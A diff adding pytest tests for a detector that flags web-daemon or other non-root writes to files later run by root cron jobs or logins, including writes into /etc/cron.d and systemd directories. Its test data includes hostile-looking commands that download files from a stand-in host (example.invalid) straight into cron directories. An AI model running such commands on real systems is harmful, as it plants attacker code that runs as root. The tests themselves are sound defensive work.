@@ -340,7 +340,6 @@ def test_same_basename_in_another_directory_is_not_matched():
     (["ls", "/usr/share/vim/vim91/"], "/usr/bin/ls"),                               # tool name in a path
     (["sed-wrapper", "-i", JOB], "/usr/local/bin/sed-wrapper"),                    # not sed by kernel identity
     (["vi"], "/usr/bin/vim.basic"),                                                 # editor with no file
-    (["sh", "-c", f"vi {JOB} 2>&1 | true"], "/usr/bin/dash"),                      # unmodelled: partial, no match
 ])
 def test_reads_mentions_and_lookalikes_are_not_writes(argv, exe):
     assert run([web(argv, exe), *cron_runs(T0 + timedelta(minutes=10))])[1] == []
@@ -356,6 +355,138 @@ def test_writer_elevating_own_file_in_own_login_is_not_matched():
 def test_another_hosts_root_job_does_not_join():
     writer = web(*VI)
     assert run([writer, *cron_runs(T0 + timedelta(minutes=10), host="db01")])[1] == []
+
+
+# ---------------------------------------------------------------- the writer's own elevation: never via inherited auid
+def test_web_daemon_with_inherited_root_auid_is_reported_for_a_root_cron_run():
+    # (a) apache started from a root login: www-data inherits auid 0, and root's cron session also has auid 0
+    writer = web(*VI, auid=0, ses=5)
+    _pb, out = run([writer, *cron_runs(T0 + timedelta(minutes=10))])
+    assert len(out) == 1 and out[0].proposed_lane == "high"
+
+
+def test_web_daemon_with_inherited_root_auid_is_reported_for_a_root_login_run():
+    # (b) the same writer, then a root login (auid 0, a new session) runs the file
+    writer = web(*VI, auid=0, ses=5)
+    login = ex(["/bin/bash", JOB], "/usr/bin/bash", 0, T0 + timedelta(minutes=3), auid=0, ses=50, pid=950, ppid=949)
+    _pb, out = run([writer, login])
+    assert len(out) == 1 and out[0].proposed_lane == "high" and "audit login uid 0" in out[0].claim
+
+
+def test_web_daemon_restarted_by_an_admin_is_reported_for_that_admins_sudo_run():
+    # (c) `sudo apachectl restart` by admin 1000: www-data inherits auid 1000; the admin later runs the file with sudo
+    writer = web(*VI, auid=1000, ses=12)
+    sudo_run = ex(["bash", JOB], "/usr/bin/bash", 0, T0 + timedelta(minutes=3), auid=1000, ses=77, pid=950,
+                  ppid=949)
+    _pb, out = run([writer, sudo_run])
+    assert len(out) == 1 and out[0].proposed_lane == "high"
+
+
+def test_web_writer_is_never_excluded_even_in_the_same_session():
+    writer = web(*VI, auid=1000, ses=12)
+    same = ex(["bash", JOB], "/usr/bin/bash", 0, T0 + timedelta(minutes=3), auid=1000, ses=12, pid=950, ppid=949)
+    assert len(run([writer, same])[1]) == 1
+
+
+def test_non_web_writer_excluded_only_by_own_session_or_own_uid():
+    alice = ex(["vi", JOB], "/usr/bin/vim.basic", 1000, T0, auid=1000, ses=3, pid=900, ppid=899)
+    # her own uid as the login uid of a root run in another session: her own sudo
+    own_sudo = ex(["bash", JOB], "/usr/bin/bash", 0, T0 + timedelta(minutes=3), auid=1000, ses=9, pid=950, ppid=949)
+    assert run([alice, own_sudo])[1] == []
+    # a process of hers that inherited auid 0 does not make root's logins hers
+    inherited = ex(["vi", JOB], "/usr/bin/vim.basic", 1000, T0, auid=0, ses=4, pid=900, ppid=899)
+    root_login = ex(["bash", JOB], "/usr/bin/bash", 0, T0 + timedelta(minutes=3), auid=0, ses=60, pid=950, ppid=949)
+    assert len(run([inherited, root_login])[1]) == 1
+    # ... but a root run inside that very audit session is her own elevation
+    same_session = ex(["bash", JOB], "/usr/bin/bash", 0, T0 + timedelta(minutes=3), auid=0, ses=4, pid=950, ppid=949)
+    assert run([inherited, same_session])[1] == []
+
+
+def test_scheduler_session_excluded_only_when_it_is_the_writers_own_crontab():
+    alice = ex(["vi", JOB], "/usr/bin/vim.basic", 1000, T0, auid=1000, ses=3)
+    own_cron = [ev("auth", T0 + timedelta(minutes=5), auth__service="cron", auth__phase="session_open",
+                   process__session_id=40, process__pid=6000, user__name="alice", process__auid="1000"),
+                ex(["sudo", JOB], "/usr/bin/sudo", 1000, T0 + timedelta(minutes=5, seconds=1), auid=1000, ses=40,
+                   euid=0, pid=6001, ppid=6000),
+                ex(["/bin/bash", JOB], "/usr/bin/bash", 0, T0 + timedelta(minutes=5, seconds=2), auid=1000, ses=40,
+                   pid=6002, ppid=6001)]
+    assert run([alice, *own_cron])[1] == []
+    inherited = ex(["vi", JOB], "/usr/bin/vim.basic", 1000, T0, auid=0, ses=3)    # root's cron is never hers
+    assert len(run([inherited, *cron_runs(T0 + timedelta(minutes=10))])[1]) == 1
+
+
+def test_setuid_root_writer_is_root_not_a_non_root_writer():
+    # real uid 1000, effective uid 0: the write is made as root, so it is not this behaviour
+    setuid = ex(["tee", JOB], "/usr/local/bin/tee", 1000, T0, auid=1000, euid=0)
+    assert run([setuid, *cron_runs(T0 + timedelta(minutes=10))])[1] == []
+
+
+# ---------------------------------------------------------------- writes into a schedule directory
+@pytest.mark.parametrize("argv,exe,cwd,written", [
+    (["cp", "/tmp/evil", "/etc/cron.d"], "/usr/bin/cp", None, "/etc/cron.d/evil"),
+    (["mv", "/tmp/evil.service", "/etc/systemd/system"], "/usr/bin/mv", None, "/etc/systemd/system/evil.service"),
+    (["install", "-m", "644", "/tmp/evil", "/etc/cron.d"], "/usr/bin/install", None, "/etc/cron.d/evil"),
+    (["ln", "-s", "/tmp/evil", "/etc/cron.hourly"], "/usr/bin/ln", None, "/etc/cron.hourly/evil"),
+    (["sh", "-c", "cd /etc/cron.d && cp /tmp/evil ."], "/usr/bin/dash", None, "/etc/cron.d/evil"),
+    (["cp", "/tmp/evil", "."], "/usr/bin/cp", "/etc/cron.d", "/etc/cron.d/evil"),
+    (["rsync", "/tmp/evil", "/etc/cron.d/"], "/usr/bin/rsync", None, "/etc/cron.d/evil"),
+    (["rsync", "-a", "/tmp/evil", "/etc/cron.d"], "/usr/bin/rsync", None, "/etc/cron.d/evil"),
+    (["scp", "user@example.invalid:evil", "/etc/cron.d/"], "/usr/bin/scp", None, "/etc/cron.d/evil"),
+    (["wget", "-P", "/etc/cron.d", "http://example.invalid/evil"], "/usr/bin/wget", None, "/etc/cron.d/evil"),
+    (["wget", "-qP", "/etc/cron.d", "http://example.invalid/evil"], "/usr/bin/wget", None, "/etc/cron.d/evil"),
+    (["wget", "--directory-prefix=/etc/cron.d", "http://example.invalid/evil"], "/usr/bin/wget", None,
+     "/etc/cron.d/evil"),
+    (["sh", "-c", "cd /etc/cron.d && wget http://example.invalid/evil"], "/usr/bin/dash", None, "/etc/cron.d/evil"),
+    (["curl", "-sO", "http://example.invalid/evil"], "/usr/bin/curl", "/etc/cron.d", "/etc/cron.d/evil"),
+    (["curl", "--remote-name", "http://example.invalid/evil"], "/usr/bin/curl", "/etc/cron.d", "/etc/cron.d/evil"),
+    (["curl", "--output-dir", "/etc/cron.d", "-O", "http://example.invalid/evil"], "/usr/bin/curl", None,
+     "/etc/cron.d/evil"),
+])
+def test_web_writes_into_a_schedule_directory_are_found(argv, exe, cwd, written):
+    _pb, out = run([web(argv, exe, cwd=cwd)])
+    assert len(out) == 1, argv
+    assert out[0].proposed_lane == "high" and f"on {written} " in out[0].claim
+
+
+def test_downloads_without_a_file_name_or_to_stdout_are_not_writes():
+    assert run([web(["curl", "-s", "http://example.invalid/evil"], "/usr/bin/curl", cwd="/etc/cron.d")])[1] == []
+    assert run([web(["wget", "-O", "-", "http://example.invalid/evil"], "/usr/bin/wget", cwd="/etc/cron.d")])[1] == []
+    pb, out = run([web(["wget", "http://example.invalid/evil"], "/usr/bin/wget", cwd=None)])
+    assert out == [] and pb.missing_required == 1          # the download's directory is unknown: partial
+
+
+def test_unmodelled_editor_redirect_text_is_counted_partial():
+    pb, out = run([web(["sh", "-c", f"vi {JOB} 2>&1 | true"], "/usr/bin/dash"), *cron_runs(T0 + timedelta(minutes=10))])
+    assert out == [] and pb.missing_required == 1
+
+
+def test_failure_lowering_reads_every_writer_record_not_only_the_cited_ones():
+    failed = [web(["tee", "-a", JOB], "/usr/bin/tee", ts=T0 + timedelta(seconds=i), outcome=Outcome.failure)
+              for i in range(12)]
+    late_ok = web(["tee", "-a", JOB], "/usr/bin/tee", ts=T0 + timedelta(seconds=30))
+    _pb, out = run([*failed, late_ok, *cron_runs(T0 + timedelta(minutes=10))])
+    assert out[0].proposed_lane == "high"                  # the 13th record (uncited) succeeded
+    _pb, out = run([*failed, *cron_runs(T0 + timedelta(minutes=10))])
+    assert out[0].proposed_lane == "lead"
+
+
+def test_determinism_across_partition_boundaries_and_partition_order():
+    events = sorted([web(*VI), web(["tee", JOB], "/usr/bin/tee", ts=T0 + timedelta(seconds=5)),
+                     ex(["vi", JOB], "/usr/bin/vim.basic", 1000, T0 + timedelta(seconds=7), auid=1000),
+                     *cron_runs(T0 + timedelta(minutes=10)), *cron_runs(T0 + timedelta(minutes=20), pid=5100)],
+                    key=lambda e: (e.ts, e.id))
+
+    def view(out):
+        return [(m.group_key, m.claim, m.proposed_lane, [e.id for e in m.events]) for m in out]
+
+    baseline = view(run(events)[1])
+    for size in (1, 2, 3, 5):                              # chronological partitions of any size: identical output
+        parts = [events[i:i + size] for i in range(0, len(events), size)]
+        assert view(run(*parts)[1]) == baseline
+    for seed in range(5):                                  # partitions in any order: same findings and lanes
+        parts = [events[i:i + 3] for i in range(0, len(events), 3)]
+        random.Random(seed).shuffle(parts)
+        assert [(k, lane) for k, _c, lane, _e in view(run(*parts)[1])] == [(k, lane) for k, _c, lane, _e in baseline]
 
 
 # ---------------------------------------------------------------- missing fields: partial, never a clean no-match
